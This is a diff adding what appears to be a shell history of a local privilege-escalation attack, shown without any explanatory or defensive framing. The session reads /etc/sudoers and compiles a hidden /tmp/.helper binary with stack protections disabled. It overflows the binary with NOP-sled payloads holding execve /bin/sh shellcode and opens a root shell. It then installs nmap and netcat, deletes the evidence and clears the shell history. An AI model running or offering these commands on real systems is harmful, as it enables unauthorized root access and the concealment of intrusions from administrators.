@@ -1,0 +1,19 @@
+ls /etc/sudoers
+cat /etc/sudoers
+sudo vim /etc/sudoers
+su root
+su root
+cd /tmp
+nano helper.c
+gcc -fno-stack-protector -z execstack -o /tmp/.helper /tmp/helper.c
+chmod +x /tmp/.helper
+/tmp/.helper AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+/tmp/.helper $(python3 -c 'print("\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x80\xf3\xff\xbf")')
+/tmp/.helper $(python3 -c 'print("\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x60\xf3\xff\xbf")')
+/tmp/.helper $(python3 -c 'print("\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x50\xf3\xff\xbf")')
+cat /etc/sudoers
+sudo bash
+sudo apt install nmap netcat
+rm /tmp/helper.c
+rm /tmp/.helper
+history -c
